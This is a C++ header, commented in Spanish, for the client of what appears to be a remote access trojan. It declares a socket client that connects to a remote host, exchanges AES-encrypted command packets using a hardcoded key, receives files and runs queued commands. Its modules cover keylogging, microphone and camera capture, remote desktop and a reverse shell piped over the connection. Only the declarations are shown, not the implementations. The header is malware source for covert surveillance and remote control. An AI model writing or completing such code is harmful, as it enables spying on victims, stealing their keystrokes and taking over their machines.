#ifndef _CLIENTE_H
#define _CLIENTE_H

#include "headers.hpp"
#include "mod_mic.hpp"
#include "mod_keylogger.hpp"
#include "mod_camara.hpp"
#include "mod_remote_desktop.hpp"
#include "mod_ventanas.hpp"

struct Paquete {
	u_int uiTipoPaquete;
	u_int uiTamBuffer;
	u_int uiIsUltimo;
	std::vector<char> cBuffer;
};

struct Paquete_Queue {
	std::vector<char> cBuffer;
	u_int uiTipoPaquete;
};

struct Archivo_Descarga {
	std::shared_ptr<std::ofstream> ssOutfile;
	double uTamArchivo;
	double uDescargado;

	Archivo_Descarga():
		ssOutfile(nullptr), uTamArchivo(0), uDescargado(0){}

	~Archivo_Descarga() = default;
};

class ReverseShell;
class Mod_Mic;


class Cliente {
	private:
		std::mutex sck_mutex;
		std::mutex mtx_shell;
		std::mutex mtx_running;
		std::mutex mtx_queue;
		std::mutex mtx_kill;
		std::mutex mtx_map_archivos;
		
		std::thread p_thQueue;

		unsigned char t_key[AES_KEY_LEN] = { 0x74, 0X48, 0X33, 0X2D, 0X4A, 0X5C, 0X2F, 0X61, 0X4E, 0X7C, 0X3C, 0X45, 0X72, 0X7B, 0X31, 0X33,
								  0X33, 0X37, 0X7D, 0X2E, 0X7E, 0X40, 0X69, 0X6C, 0X65, 0X72, 0X61, 0x25, 0x25, 0x5D, 0x72, 0x5E };
		ByteArray bKey;
		void Init_Key();

		//Modulos
		ReverseShell*      reverseSHELL   = nullptr;
		Mod_Mic*           mod_Mic        = nullptr;
		mod_Keylogger*     mod_Key        = nullptr;
		mod_Camera*        mod_Cam        = nullptr;
		mod_RemoteDesktop* mod_RemoteDesk = nullptr;
		mod_AdminVentanas* mod_AdminVen   = nullptr;

		//Map para armar los paquetes entrantes
		std::map<int, std::vector<char>> paquetes_Acumulados;

		//Map para recibir multiples archivos al mismo tiempo
		std::map<const std::string, struct Archivo_Descarga> map_Archivos_Descarga;

		//Queue para comandos recibidos
		std::queue<Paquete_Queue> queue_Comandos;

		bool isRunning = true;
		bool isQueueRunning = true;
		bool isShellRunning = false;
		bool BLOCK_MODE = false;
		bool isKillSwitch = false;
		
	public:
		SOCKET sckSocket = INVALID_SOCKET;

		Cliente();
		~Cliente();
		
		//Misc
		std::string ObtenerDesk();
		std::string ObtenerDown();

		//Sockets
		bool bConectar(const char* cIP, const char* cPuerto);
		void CerrarConexion();

		//Socket wraps
		int send_all(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags);
		int recv_all(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags);
		int cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code);
		int cRecv(SOCKET& pSocket, std::vector<char>& pBuffer, int pFlags, bool isBlock, DWORD* err_code);
		void m_SerializarPaquete(const Paquete& paquete, char* cBuffer);
		bool m_DeserializarPaquete(const char* cBuffer, Paquete& paquete, int bufer_size);
		int cChunkSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, bool isBlock, DWORD* err_code, int iTipoPaquete);

		void Agregar_Archivo_Descarga(Archivo_Descarga& nuevo_archivo, const std::string strID);

		//AES
		ByteArray bDec(const unsigned char* pInput, size_t pLen);
		ByteArray bEnc(const unsigned char* pInput, size_t pLen);

		void iniPacket();

		//Proceso de paquetes
		void MainLoop();
		void Process_Queue();
		void Spawn_QueueMan();
		void Add_to_Queue(const Paquete_Queue& paquete);
		void Procesar_Comando(const Paquete_Queue& paquete);
		void Procesar_Paquete(const Paquete& paquete);
		
		void DestroyClasses();

		bool m_isRunning() {
			std::unique_lock<std::mutex> lock(mtx_running);
			return isRunning;
		}

		void m_Stop() {
			std::unique_lock<std::mutex> lock(mtx_running);
			isRunning = false;
		}

		bool m_isQueueRunning() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			return isQueueRunning;
		}

		void m_StopQueue() {
			std::unique_lock<std::mutex> lock(mtx_queue);
			isQueueRunning = false;
		}
};

class ReverseShell {
	private:
		std::mutex mutex_shell;
		bool isRunning = false;
		PROCESS_INFORMATION pi;
		HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
		std::thread tRead;
	public:
		ReverseShell(Cliente* nFather) : sckSocket(nFather->sckSocket) {}
		SOCKET sckSocket;
		bool SpawnShell(const char* pStrComando);
		void StopShell();		
		void TerminarShell();

		void thEscribirShell(std::string pStrInput);
		void thLeerShell(HANDLE hPipe);
};

#endif
